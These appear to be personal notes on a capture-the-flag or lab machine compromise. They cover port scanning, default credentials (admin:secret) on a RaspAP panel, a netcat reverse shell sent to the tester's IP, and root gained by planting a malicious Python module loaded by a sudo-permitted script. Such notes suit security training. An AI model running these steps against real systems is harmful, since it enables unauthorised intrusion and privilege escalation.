nmap shows ports 22, 23 telnet, 25 smtp, 53 dns open
so we do a deep nmap scan, to find 8091 http, 42042 ssh

The webpage seems dead, asking for a login, nothing else
usual defaul creds dont work admin:admin, password. Note - try secret, 123456, tomcat atleast

HINT TAKEN : the popup says "raspAp", and it comes with default creds admin:secret
But it dint show us "raspAp"

Note - open popup-logins once in incognito as well
Other way is to bruteforce with hydra

Anyways, we find an exploit, but that doesnt work properly
So we look around on the webpage, and find a terminal console at system_info/console

we send ourselves a stable shell by
`nc -nv 192.168.45.245 1234 -e /bin/sh`

`sudo -l` shows we can run /home/walter/wifi_reset.py
the wifi_reset.py is looking for a module, wificontroller, which, is not present
So we write a malicious wificontroller.py as
`echo "import os; os.system('/bin/bash');" > wificontroller.py`

`sudo /usr/bin/python /home/walter/wifi_reset.py`
gave us root!